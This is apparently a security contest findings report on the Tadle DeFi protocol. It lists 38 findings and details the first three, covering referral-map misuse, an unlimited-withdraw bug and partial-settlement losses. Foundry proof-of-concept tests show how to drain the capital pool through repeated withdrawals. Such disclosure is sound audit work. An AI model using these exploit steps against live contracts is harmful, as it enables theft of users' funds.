# Tadle - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. Incorrect set up and logic of `referralInfoMap` in `SystemConfig::updateReferrerInfo` function](#H-01)
    - [H-02. TokenManager - Unlimited withdraw](#H-02) [REPORTED]
    - [H-03. Taker of bid offer will loss assets without any benefit if he calls the DeliveryPlace::settleAskMaker() for partial settlement.](#H-03)
    - [H-04. Native token withdrawal fails until manually approved](#H-04)
    - [H-05. `DeliveryPlace::settleAskTaker` Has Incorrect Access Control](#H-05)
    - [H-06. Formulaic Error Rounds Down Causing Total Loss Of Funds For Bid Takers During Abort](#H-06)
    - [H-07. Malicious user can drain protocol by bypassing `ASK` offer abortion validation in `Turbo` mode](#H-07)
    - [H-08. The `DeliveryPlace::settleAskTaker()` function mistakenly uses `makerInfo.tokenAddress` to update the `TokenBalanceType.PointToken` in the `userTokenBalanceMap` mapping, leading to a critical error.](#H-08)
    - [H-09. Token withdrawal fails until someone manually approves spending](#H-09) [REPORTED]
    - [H-10. [H-4] The function `PreMarkets::listOffer` charges an incorrect collateral amount, allowing users to manipulating collateral rates and drain the protocol's funds](#H-10)
    - [H-11. listOffer maker can settle offer via settleAskMaker() in Turbo settle type.](#H-11)
    - [H-12. Fund Withdrawal Flaw in preMarket Allows Users to Avoid Settlement Obligations](#H-12)
    - [H-13. Missing abort status check allows bid taker to steal users funds](#H-13)
    - [H-14. Missing check for aborted origin offer allows bid takers to relist unbacked offers ](#H-14)
- ## Medium Risk Findings
    - [M-01. Unnecessary balance checks and precision issues in TokenManager::_transfer](#M-01)
    - [M-02. `WrappedNativeToken` Can Only Work in `NativeToken` Mode](#M-02)
    - [M-03. `mulDiv()` can round down to 0 in realistic cases, allowing for tax avoidance](#M-03)
- ## Low Risk Findings
    - [L-01. Rounding Discrepancies in Deposit Amount Calculations](#L-01)
    - [L-02. [Low-01] Missing Access Control in `CapitalPool::approve()` Function Allows any User to call it to set Allowance Amount `TokenContract` to `type(uint256).max`.](#L-02)
    - [L-03. The referral bonus can't be split correctly between the referrer and the authority referral](#L-03)
    - [L-04. `listOffer` Unsafely References Fungible Identifiers](#L-04)
    - [L-05. Wrong parameter in event AbortBidTaker()](#L-05)
    - [L-06. Incorrect Check in closeBidOffer function](#L-06)
    - [L-07. PreMarkets - Unable to withdraw platform rewards](#L-07)
    - [L-08. Validation of `collateralRate` in `PerMarkets::createOffer` function](#L-08)
    - [L-09. CreateOffer allows eachTradeTax to be 100% ( 10000 bp ) violating code assumptions](#L-09)
    - [L-10. Missing validation in `PreMarkets.abortBidTaker()` leading to funds lock.](#L-10)
    - [L-11. The user will be able to close Bid Offer even in case if marketplace is not in BidSettling](#L-11)
    - [L-12. Trade tax and settled collateral amount are not updated in offer struct](#L-12)
    - [L-13. `PreMarket::createTaker` Should Update the `offerInfo.offerStatus` According to `amount usedPoints`](#L-13)
    - [L-14. Maker's stock status not updated.](#L-14)
    - [L-15. When the `DeliveryPlace::settleAskMaker()` function calls `tokenManager.addTokenBalance()` to update the user balance, the `TokenBalanceType` parameter uses an operation, resulting in a balance update error](#L-15)
    - [L-16. High risk of griefing attack during settlement period in Protected mode](#L-16)
    - [L-17. 3 `OfferStatus` are never used, and code seems to have contradicting intentions](#L-17)
    - [L-18. Low Severity Issues](#L-18)
    - [L-19. [H-2] `PreMarkets::createOffer` allows a user to create an offer with `eachTradeTax` more than `Constants.EACH_TRADE_TAX_MAXINUM` allowing the user to even charge 100% of the future sales](#L-19)
    - [L-20. `SystemConfig::MarketPlaceInfo.tokenPerPoint` does not take into account the possibility points will be much larger than their equivalent tokens with decimals.](#L-20)
    - [L-21. Market Makers via relisting protected offers cannot set their Maker Bonus](#L-21)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: Tadle

### Dates: Aug 6th, 2024 - Aug 13th, 2024

[See more contest details here](https://codehawks.cyfrin.io/c/2024-08-tadle)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 14
   - Medium: 3
   - Low: 21


# High Risk Findings

## <a id='H-01'></a>H-01. Incorrect set up and logic of `referralInfoMap` in `SystemConfig::updateReferrerInfo` function

_Submitted by [auditweiler](https://profiles.cyfrin.io/u/auditweiler), [4rdiii](https://profiles.cyfrin.io/u/4rdiii), [shaflow01](https://profiles.cyfrin.io/u/shaflow01), [shaka](https://profiles.cyfrin.io/u/shaka), [topstar](https://profiles.cyfrin.io/u/topstar), [0x5chn0uf](https://profiles.cyfrin.io/u/0x5chn0uf), [anusoff](https://profiles.cyfrin.io/u/anusoff), [ravikiranweb3](https://profiles.cyfrin.io/u/ravikiranweb3), [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r), [n0kto](https://profiles.cyfrin.io/u/n0kto), [azariah239](https://profiles.cyfrin.io/u/azariah239), [wellbyt3](https://profiles.cyfrin.io/u/wellbyt3), [pandasec](https://profiles.cyfrin.io/u/pandasec), [touthang](https://profiles.cyfrin.io/u/touthang), [Tomas0707](https://profiles.cyfrin.io/u/Tomas0707), [danielarmstrong](https://profiles.cyfrin.io/u/danielarmstrong), [adeolu](https://profiles.cyfrin.io/u/adeolu), [jesjupyter](https://profiles.cyfrin.io/u/jesjupyter), [eeyore](https://profiles.cyfrin.io/u/eeyore), [gajiknownnothing](https://profiles.cyfrin.io/u/gajiknownnothing), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [h2134](https://profiles.cyfrin.io/u/h2134), [100HP](https://codehawks.cyfrin.io/team/clzlerf3j0009onp0zvsoyzzl), [0xbeastboy](https://profiles.cyfrin.io/u/0xbeastboy), [ke1cam](https://profiles.cyfrin.io/u/ke1cam), [karanel](https://profiles.cyfrin.io/u/karanel), [irondevx](https://profiles.cyfrin.io/u/irondevx), [0xpep7](https://profiles.cyfrin.io/u/0xpep7), [y4y](https://profiles.cyfrin.io/u/y4y), [pelz](https://profiles.cyfrin.io/u/pelz), [0xnbvc](https://profiles.cyfrin.io/u/0xnbvc), [0xHunter](https://profiles.cyfrin.io/u/0xHunter), [MinhTriet](https://profiles.cyfrin.io/u/MinhTriet), [n08ita](https://profiles.cyfrin.io/u/n08ita), [kiteweb3](https://profiles.cyfrin.io/u/kiteweb3), [Hrom131](https://profiles.cyfrin.io/u/Hrom131), [mikebello](https://profiles.cyfrin.io/u/mikebello), [izuman](https://profiles.cyfrin.io/u/izuman), [sabit](https://profiles.cyfrin.io/u/sabit), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [chaossr](https://profiles.cyfrin.io/u/chaossr), [fyamf](https://profiles.cyfrin.io/u/fyamf), [mattjenkins](https://profiles.cyfrin.io/u/mattjenkins), [typical_human](https://profiles.cyfrin.io/u/typical_human), [praise03](https://profiles.cyfrin.io/u/praise03), [mgf15](https://profiles.cyfrin.io/u/mgf15), [0xb0k0](https://profiles.cyfrin.io/u/0xb0k0), [dadekuma](https://profiles.cyfrin.io/u/dadekuma), [ivanfitro](https://profiles.cyfrin.io/u/ivanfitro), [rio1101](https://profiles.cyfrin.io/u/rio1101), [nervouspika](https://profiles.cyfrin.io/u/nervouspika), [robertodf99](https://profiles.cyfrin.io/u/robertodf99), [emanherawy](https://profiles.cyfrin.io/u/emanherawy), [octeezy](https://profiles.cyfrin.io/u/octeezy), [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [turvec](https://profiles.cyfrin.io/u/turvec), [josh4324](https://profiles.cyfrin.io/u/josh4324), [pro_king](https://profiles.cyfrin.io/u/pro_king), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [brene](https://profiles.cyfrin.io/u/brene), [seersec](https://profiles.cyfrin.io/u/seersec), [decap](https://profiles.cyfrin.io/u/decap), [marswhitehacker](https://profiles.cyfrin.io/u/marswhitehacker), [MSaptarshi007](https://profiles.cyfrin.io/u/MSaptarshi007), [Chad0](https://profiles.cyfrin.io/u/Chad0), [Zealynx](https://codehawks.cyfrin.io/team/clt8owsuc0001dt11do7vyoi3), [Fortis Audits](https://codehawks.cyfrin.io/team/cly2eas2s000gpgez427qfcw9), [ast3ros](https://profiles.cyfrin.io/u/ast3ros), [VaRuN](https://profiles.cyfrin.io/u/VaRuN), [pina](https://profiles.cyfrin.io/u/pina), [nikhil20](https://profiles.cyfrin.io/u/nikhil20), [baz1ka](https://profiles.cyfrin.io/u/baz1ka), [rbserver](https://profiles.cyfrin.io/u/rbserver), [bkweb3](https://profiles.cyfrin.io/u/bkweb3), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [shahilhussain](https://profiles.cyfrin.io/u/shahilhussain), [ge6a](https://profiles.cyfrin.io/u/ge6a), [zukanopro](https://profiles.cyfrin.io/u/zukanopro), [recursiveeth](https://profiles.cyfrin.io/u/recursiveeth), [dinkras](https://profiles.cyfrin.io/u/dinkras), [simon0417](https://profiles.cyfrin.io/u/simon0417), [0x1912](https://profiles.cyfrin.io/u/0x1912), [hunter_w3b](https://profiles.cyfrin.io/u/hunter_w3b), [kamensec](https://profiles.cyfrin.io/u/kamensec), [0xspryon](https://profiles.cyfrin.io/u/0xspryon), [honour](https://profiles.cyfrin.io/u/honour), [456456](https://profiles.cyfrin.io/u/456456), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [0xrolko](https://profiles.cyfrin.io/u/0xrolko), [bladesec](https://profiles.cyfrin.io/u/bladesec), [zer0](https://profiles.cyfrin.io/u/zer0), [tinnohofficial](https://profiles.cyfrin.io/u/tinnohofficial), [valy001](https://profiles.cyfrin.io/u/valy001), [y0ng0p3](https://profiles.cyfrin.io/u/y0ng0p3), [nilay27](https://profiles.cyfrin.io/u/nilay27), [BaldHeads](https://codehawks.cyfrin.io/team/clzr48l1m0007f5dkdtnxy0wq), [aresaudits](https://profiles.cyfrin.io/u/aresaudits), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [0xrststn](https://profiles.cyfrin.io/u/0xrststn), [pontifex](https://profiles.cyfrin.io/u/pontifex). Selected submission by: [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169)._      
            


## Summary
- The `referralInfo` contains 3 members: `referrer`, `referrerRate` and `authorityRate`.
- Here referrer is the person which has referred the other person.
- The referralInfoMap contains a mapping from an address to `ReferralInfo`, where it is expected to return the 3 members mentioned above for a person who is referred by the `referrer`, but the `referralInfoMap` sets the referrer address to all the 3 members which is incorrect.
- As well as anyone can call the function to update the mapping for any address and set arbitrary value for whole mapping members as well as the address for which the mapping is mapped to `referralInfo`

## Vulnerability Details
- The vulnerability is present in the `updateReferrerInfo` function where it allows the caller to set up any arbitrary values for the `referrer`, `referrerRate` and `authorityRate`, as well as the address for which mapping is mapped from is also set to as `referrer`.
- As a result of which anyone can maliciously set values for anyone, but where it is expected that the referrer should only be able to set value for the person to whom he is referring.
- When a user calls the `updateReferrerInfo` function, it sets the mapping as `referralInfoMap[referrer]`, and sets up all the values as passed.

- The referral bonus is allocated during the call to `createTaker` via `_updateReferralBonus` function, where it uses the values as:
```
referralInfoMap[msg.sender], where msg.sender is the one to whom referrer has referred to
```
- The vulnerability occurs due to the fact that the function allows to set the referrer to any arbitrary address by the caller to their own referral, where it was expected that the referrer should be the `msg.sender` and the caller sets up the mapping's  address from which is mapped to the authority rate which is expected to be passed in the function instead of referrer.

Therefore, it was expected that the caller for `updateReferrerInfo` function should only be the referrer and sets the authority to whom he is referring to.


## Impact
- Incorrect values are set in the `referralInfoMap` which leads to incorrect allocation in `createTaker` function's referral allocation.
- As a user can call the function with any arbitrary address, therefore they can set up their own other address as referrer where `referrer` as well as the authority to whom referrer is expected to refer to is set to a single address, so a user gets whole discount on platform fee for both referrer and their own (i.e. authority).
- Also, anyone can front-run the `updateReferrerInfo` function before a user calls `createTaker` and can maliciously update the authorityRate or the referralRate as a result of which the taker will experience different results.

## Tools Used
Manual Review

## Recommendations
Make the referrer to call the `updateReferrerInfo` as msg.sender, and pass `authority` as a parameter to be set up as the one to whom referrer is referring to.

## <a id='H-02'></a>H-02. TokenManager - Unlimited withdraw

_Submitted by [urs28rs1](https://profiles.cyfrin.io/u/urs28rs1), [Hrom131](https://profiles.cyfrin.io/u/Hrom131), [holydevoti0n](https://profiles.cyfrin.io/u/holydevoti0n), [pelz](https://profiles.cyfrin.io/u/pelz), [auditweiler](https://profiles.cyfrin.io/u/auditweiler), [0x5chn0uf](https://profiles.cyfrin.io/u/0x5chn0uf), [4gontuk](https://profiles.cyfrin.io/u/4gontuk), [kevinkkien](https://profiles.cyfrin.io/u/kevinkkien), [typical_human](https://profiles.cyfrin.io/u/typical_human), [shaflow01](https://profiles.cyfrin.io/u/shaflow01), [danielarmstrong](https://profiles.cyfrin.io/u/danielarmstrong), [bengalcatbalu](https://profiles.cyfrin.io/u/bengalcatbalu), [galturok](https://profiles.cyfrin.io/u/galturok), [oxelmiguel](https://profiles.cyfrin.io/u/oxelmiguel), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [lazydog](https://profiles.cyfrin.io/u/lazydog), [danielwang8824](https://profiles.cyfrin.io/u/danielwang8824), [dustinhuel2](https://profiles.cyfrin.io/u/dustinhuel2), [4rdiii](https://profiles.cyfrin.io/u/4rdiii), [touthang](https://profiles.cyfrin.io/u/touthang), [emanherawy](https://profiles.cyfrin.io/u/emanherawy), [greese](https://profiles.cyfrin.io/u/greese), [izcoser](https://profiles.cyfrin.io/u/izcoser), [pyro](https://profiles.cyfrin.io/u/pyro), [adeolu](https://profiles.cyfrin.io/u/adeolu), [kodyvim](https://profiles.cyfrin.io/u/kodyvim), [0xpep7](https://profiles.cyfrin.io/u/0xpep7), [wellbyt3](https://profiles.cyfrin.io/u/wellbyt3), [eeyore](https://profiles.cyfrin.io/u/eeyore), [gajiknownnothing](https://profiles.cyfrin.io/u/gajiknownnothing), [kwakudr](https://profiles.cyfrin.io/u/kwakudr), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [100HP](https://codehawks.cyfrin.io/team/clzlerf3j0009onp0zvsoyzzl), [abhishekthakur](https://profiles.cyfrin.io/u/abhishekthakur), [th3l1ghtd3m0n](https://profiles.cyfrin.io/u/th3l1ghtd3m0n), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [4lifemen](https://profiles.cyfrin.io/u/4lifemen), [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [n08ita](https://profiles.cyfrin.io/u/n08ita), [karanel](https://profiles.cyfrin.io/u/karanel), [yotov721](https://profiles.cyfrin.io/u/yotov721), [0xswahili](https://profiles.cyfrin.io/u/0xswahili), [irondevx](https://profiles.cyfrin.io/u/irondevx), [0xdarko](https://profiles.cyfrin.io/u/0xdarko), [youleeyan](https://profiles.cyfrin.io/u/youleeyan), [MinhTriet](https://profiles.cyfrin.io/u/MinhTriet), [0xnbvc](https://profiles.cyfrin.io/u/0xnbvc), [0xHunter](https://profiles.cyfrin.io/u/0xHunter), [radin100](https://profiles.cyfrin.io/u/radin100), [p6rkdoye0n](https://profiles.cyfrin.io/u/p6rkdoye0n), [ragnarok](https://profiles.cyfrin.io/u/ragnarok), [0xasp](https://profiles.cyfrin.io/u/0xasp), [aksoy](https://profiles.cyfrin.io/u/aksoy), [bigsam](https://profiles.cyfrin.io/u/bigsam), [demorextess](https://profiles.cyfrin.io/u/demorextess), [kingnull](https://profiles.cyfrin.io/u/kingnull), [4eyes](https://codehawks.cyfrin.io/team/clzp933py000dnn0wn5ui2a7b), [almantare](https://profiles.cyfrin.io/u/almantare), [izuman](https://profiles.cyfrin.io/u/izuman), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [ivanfitro](https://profiles.cyfrin.io/u/ivanfitro), [jesjupyter](https://profiles.cyfrin.io/u/jesjupyter), [oxwhite](https://profiles.cyfrin.io/u/oxwhite), [0bingo76](https://profiles.cyfrin.io/u/0bingo76), [Fortis Audits](https://codehawks.cyfrin.io/team/cly2eas2s000gpgez427qfcw9), [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb), [pina](https://profiles.cyfrin.io/u/pina), [0xcontrol](https://profiles.cyfrin.io/u/0xcontrol), [ZeroProtocol](https://profiles.cyfrin.io/u/ZeroProtocol), [mgf15](https://profiles.cyfrin.io/u/mgf15), [dadekuma](https://profiles.cyfrin.io/u/dadekuma), [lumoswiz](https://profiles.cyfrin.io/u/lumoswiz), [waydou](https://profiles.cyfrin.io/u/waydou), [praise03](https://profiles.cyfrin.io/u/praise03), [jprod15](https://profiles.cyfrin.io/u/jprod15), [octeezy](https://profiles.cyfrin.io/u/octeezy), [turvec](https://profiles.cyfrin.io/u/turvec), [0xloscar01](https://profiles.cyfrin.io/u/0xloscar01), [0xaman](https://profiles.cyfrin.io/u/0xaman), [h2134](https://profiles.cyfrin.io/u/h2134), [decap](https://profiles.cyfrin.io/u/decap), [pascal](https://profiles.cyfrin.io/u/pascal), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [0xkrkba](https://profiles.cyfrin.io/u/0xkrkba), [devanas](https://profiles.cyfrin.io/u/devanas), [fyamf](https://profiles.cyfrin.io/u/fyamf), [atharv181](https://profiles.cyfrin.io/u/atharv181), [bkweb3](https://profiles.cyfrin.io/u/bkweb3), [VaRuN](https://profiles.cyfrin.io/u/VaRuN), [dinkras](https://profiles.cyfrin.io/u/dinkras), [audinarey](https://profiles.cyfrin.io/u/audinarey), [baz1ka](https://profiles.cyfrin.io/u/baz1ka), [Chad0](https://profiles.cyfrin.io/u/Chad0), [rbserver](https://profiles.cyfrin.io/u/rbserver), [x18a6](https://profiles.cyfrin.io/u/x18a6), [amaron](https://profiles.cyfrin.io/u/amaron), [zer0](https://profiles.cyfrin.io/u/zer0), [inzinko](https://profiles.cyfrin.io/u/inzinko), [wickie](https://profiles.cyfrin.io/u/wickie), [bijan](https://profiles.cyfrin.io/u/bijan), [tnevler](https://profiles.cyfrin.io/u/tnevler), [0xshoonya](https://profiles.cyfrin.io/u/0xshoonya), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [ni8mare](https://profiles.cyfrin.io/u/ni8mare), [TeamRockSolid](https://codehawks.cyfrin.io/team/clygyrphg000bl0xpkpo7qch4), [0xrststn](https://profiles.cyfrin.io/u/0xrststn), [0x1912](https://profiles.cyfrin.io/u/0x1912), [_frolic](https://profiles.cyfrin.io/u/_frolic), [0xphantom](https://profiles.cyfrin.io/u/0xphantom), [bladesec](https://profiles.cyfrin.io/u/bladesec), [avci](https://profiles.cyfrin.io/u/avci), [dimah7](https://profiles.cyfrin.io/u/dimah7), [philbugcatcher](https://profiles.cyfrin.io/u/philbugcatcher), [gkrastenov](https://profiles.cyfrin.io/u/gkrastenov), [dobrevaleri](https://profiles.cyfrin.io/u/dobrevaleri), [aresaudits](https://profiles.cyfrin.io/u/aresaudits), [0xmakeouthill](https://profiles.cyfrin.io/u/0xmakeouthill), [dipp](https://profiles.cyfrin.io/u/dipp), [josh4324](https://profiles.cyfrin.io/u/josh4324), [Audittens](https://profiles.cyfrin.io/u/Audittens), [pontifex](https://profiles.cyfrin.io/u/pontifex). Selected submission by: [Hrom131](https://profiles.cyfrin.io/u/Hrom131)._      
            


## Summary

Due to the fact that the `withdraw` function from the `TokenManager` contract does not reset users' balances after withdrawals, users can repeat withdrawals from the contract an unlimited number of times, thus stealing funds from other users.

## Vulnerability Details

In the `withdraw` function of the `TokenManager` contract, it is possible to unlimitedly withdraw tokens from the `CapitalPool` contract.

The `withdraw` function allows any user to withdraw tokens they have earned on their balance, but the user's balance is not updated anywhere after the withdrawal.

The [code](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/TokenManager.sol#L141) for getting the user's balance:

```Solidity
uint256 claimAbleAmount = userTokenBalanceMap[_msgSender()][
            _tokenAddress
        ][_tokenBalanceType];
```

As an example, let's consider the simplest scenario of an attack on a system that will exploit the found vulnerability:

1. First, the user needs to make it so that they have some sort of balance within the `TokenManager` contract.
   1. To do this, it is enough to create an offer using the `createOffer` function of the `PreMarkets` contract. During creation, the user will send some tokens as a collateral.
   2. Then it is necessary to abort the offer immediately using the `abortAskOffer` function of the `PreMarkets` contract. This abort will add a refund amount to the user's balance in the `TokenManager` contract.
2. Send a huge number of transactions, within which there will be a call to the `TokenManager` contract `withdraw` function. The number of transactions will depend on how many tokens are inside the `CapitalPool` contract.

This is the simplest attack option, but it is possible to create a special contract on whose behalf to interact with the protocol. Then the attack can be accomplished in a single transaction, which will be much more efficient.

### Test code that demonstrates the vulnerability described above

To run the test, its code without changes should be placed in the **PreMarkets.t.sol** file.

```Solidity
function test_unlimited_withdraw() public {
        vm.startPrank(user);

        capitalPool.approve(address(mockUSDCToken));

        uint256 userPaidAmount = 12000 * 1e18;

        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                10000,
                10000 * 1e18,
                12000,
                300,
                OfferType.Ask,
                OfferSettleType.Turbo
            )
        );
        vm.stopPrank();

        assertEq(mockUSDCToken.balanceOf(address(capitalPool)), userPaidAmount);

        vm.startPrank(user2);

        uint256 user2PaidAmount = 120 * 1e18;

        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                10000,
                100 * 1e18,
                12000,
                300,
                OfferType.Ask,
                OfferSettleType.Turbo
            )
        );

        assertEq(mockUSDCToken.balanceOf(address(capitalPool)), userPaidAmount + user2PaidAmount);

        address user2OfferAddr = GenerateAddress.generateOfferAddress(1);
        address user2StockAddr = GenerateAddress.generateStockAddress(1);

        preMarktes.abortAskOffer(user2StockAddr, user2OfferAddr);

        assertEq(tokenManager.userTokenBalanceMap(user2, address(mockUSDCToken), TokenBalanceType.MakerRefund), user2PaidAmount);

        uint256 user2BalanceBefore = mockUSDCToken.balanceOf(user2);

        for (uint256 i = 0; i < 101; i++) {
            tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.MakerRefund);
        }

        assertEq(mockUSDCToken.balanceOf(address(capitalPool)), 0);
        assertEq(mockUSDCToken.balanceOf(user2) - user2BalanceBefore, userPaidAmount + user2PaidAmount);

        vm.stopPrank();
    }
```

## Impact

It is possible to withdraw absolutely all funds from CapitalPool contract, so this bug is critical.

## Tools Used

The bug was found by manually auditing the contract code. To validate the vulnerability and demonstrate it, a unit test was written.

## Recommendations

Update value in `userTokenBalanceMap` inside `withdraw` function.

## <a id='H-03'></a>H-03. Taker of bid offer will loss assets without any benefit if he calls the DeliveryPlace::settleAskMaker() for partial settlement.

_Submitted by [eeyore](https://profiles.cyfrin.io/u/eeyore), [bauchibred](https://profiles.cyfrin.io/u/bauchibred), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [h2134](https://profiles.cyfrin.io/u/h2134), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [fyamf](https://profiles.cyfrin.io/u/fyamf), [dadekuma](https://profiles.cyfrin.io/u/dadekuma), [bigsam](https://profiles.cyfrin.io/u/bigsam), [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [stanchev](https://profiles.cyfrin.io/u/stanchev), [touthang](https://profiles.cyfrin.io/u/touthang), [cheatcode](https://profiles.cyfrin.io/u/cheatcode), [Chad0](https://profiles.cyfrin.io/u/Chad0), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [pascal](https://profiles.cyfrin.io/u/pascal), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [audinarey](https://profiles.cyfrin.io/u/audinarey), [0xb0k0](https://profiles.cyfrin.io/u/0xb0k0), [OdeWeb3](https://codehawks.cyfrin.io/team/cluqfw65k000169faytyphjol), [0xrststn](https://profiles.cyfrin.io/u/0xrststn), [abhishekthakur](https://profiles.cyfrin.io/u/abhishekthakur), [inzinko](https://profiles.cyfrin.io/u/inzinko), [baz1ka](https://profiles.cyfrin.io/u/baz1ka), [kupiasec](https://profiles.cyfrin.io/u/kupiasec), [_frolic](https://profiles.cyfrin.io/u/_frolic), [pavankv](https://profiles.cyfrin.io/u/pavankv), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169). Selected submission by: [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb)._      
            


## Summary

Taker of bid offer will loss point token &  `collateralFee` without any benefit if he calls the `DeliveryPlace::settleAskMaker()` for partial settlement.

## Vulnerability Details

Nothing stops a taker of a bid offer to do partial settlement by calling `settleAskTaker()`, but partial settlement results loss of `collateralFee` and Point token for the taker.
**NOTE**: To execute the PoC given below properly we need to fix 2 issue of this code, I already submitted the report regarding that issue, you can find that issue with this title: _Call to settleAskTaker() will fail every time due to wrong authority check._ In short you need to correct the authority check in `settleAskTaker()` by changing it from `offerInfo.authority` to `stockInfo.authority`, [here](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L361).
And change the token type from `makerInfo.tokenAddress` to `marketPlaceInfo.tokenAddress`, [here](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L387), I have already submitted the issue, you can find that with this title: _Wrong token is added to userTokenBalanceMap due to incorrect argument_.
I hope you fixed that issue, now lets run the PoC in Premarkets.t.sol contract:

```solidity
    function test_noBenefit() public {
        deal(address(mockPointToken), address(user4), 100e18);

        //@audit User creating a Bid offer, to buy 1000 point
        vm.startPrank(user);
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                0.01 * 1e18,
                12000,
                300,
                OfferType.Bid,
                OfferSettleType.Turbo
            )
        );
        vm.stopPrank();

        //@audit User4 created a stock to sell 500 point to user's Bid offer
        vm.startPrank(user4);
        address offerAddr = GenerateAddress.generateOfferAddress(0);
        preMarktes.createTaker(offerAddr, 500);

        address stock1Addr = GenerateAddress.generateStockAddress(1);
        vm.stopPrank();

        //@audit updateMarket() is called to set the timestamp in 'settlementPeriod' i.e tge was done
        // & we are in now settlementPeriod
        vm.startPrank(user1);
        systemConfig.updateMarket(
            "Backpack",
            address(mockPointToken),
            0.01 * 1e18,
            block.timestamp - 1,
            3600
        );
        //@audit updating the marketPlaceStatus to AskSettling
        systemConfig.updateMarketPlaceStatus(
            "Backpack",
            MarketPlaceStatus.AskSettling
        );
        vm.stopPrank();

        //@audit Now the user came & closed the Bid offer
        vm.prank(user);
        deliveryPlace.closeBidOffer(offerAddr);
        vm.startPrank(user4);
        //@audit user4 tried to settle his Ask type stock so that he can sell points to the user
        mockPointToken.approve(address(tokenManager), 10000 * 10 ** 18);

        uint pointTokenBalancePrevious = mockPointToken.balanceOf(user4);
        uint usdcTokenBalancePrevious = mockUSDCToken.balanceOf(user4);
        console2.log(
            "Point token balance of user4 before settling: ",
            pointTokenBalancePrevious
        );
        console2.log(
            "USDC token balance of user4 before settling: ",
            usdcTokenBalancePrevious
        );
        console2.log(
            "USDC token balance of user before settling: ",
            mockUSDCToken.balanceOf(address(user))
        );
        console2.log(
            "Point token balance of user before settling: ",
            mockPointToken.balanceOf(address(user))
        );
        deliveryPlace.settleAskTaker(stock1Addr, 300);
        vm.stopPrank();
        uint ownerMakerRefund = tokenManager.userTokenBalanceMap(
            address(user),
            address(mockUSDCToken),
            TokenBalanceType.MakerRefund
        );
        uint totalUSDCTokenForUser = ownerMakerRefund +
            mockUSDCToken.balanceOf(address(user));
        uint ownerPointToken = tokenManager.userTokenBalanceMap(
            address(user),
            address(mockPointToken),
            TokenBalanceType.PointToken
        );
        uint totalPointTokenForUser = ownerPointToken +
            mockPointToken.balanceOf(address(user));
        console2.log(
            "USDC token balance of user after settling: ",
            totalUSDCTokenForUser
        );
        console2.log(
            "Point token balance of user after settling: ",
            totalPointTokenForUser
        );
        console2.log(
            "USDC token balance of user4 after settling: ",
            mockUSDCToken.balanceOf(address(user4))
        );
        console2.log(
            "Point token balance of user4 after settling: ",
            mockPointToken.balanceOf(address(user4))
        );
    }

```

Logs:

```Solidity
  Point token balance of user4 before settling:  100000000000000000000
  USDC token balance of user4 before settling:  99999999993825000000000000
  USDC token balance of user before settling:  99999999990000000000000000
  Point token balance of user before settling:  100000000000000000000000000
  USDC token balance of user after settling:  100000000001000000000000000
  Point token balance of user after settling:  100000003000000000000000000
  USDC token balance of user4 after settling:  99999999993825000000000000
  Point token balance of user4 after settling:  97000000000000000000
```

Here you can see as the user4 called the `settleAskTaker()` for partial settlement the Point was deducted from his balance, because before settlement his point token balance was: 100000000000000000000 but after settlement his point token balance came to: 97000000000000000000. But for this partial settlement he should have got USDC according to his settlement amount but he did not get anything, before settlement his USDC token balance was: 99999999993825000000000000 & after settlement his USDC token balance: 99999999993825000000000000 which is same. But if you notice the offer owner Point token balance and USDC token balance, both increased.

## Impact

The taker of a bid offer will loss his point token and `collateralFee` if he calls the `settleAskMaker()` for partial settlement.

## Tool Used

Manual review, Foundry

## Recommendation

It could be design decission to not allow any taker for partial settlement, but if so then the protocol should revert the call immediately if the settlement is partial, so that the taker do not loss his tokens.

## Related Links

<https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L335>

## <a id='H-04'></a>H-04. Native token withdrawal fails until manually approved

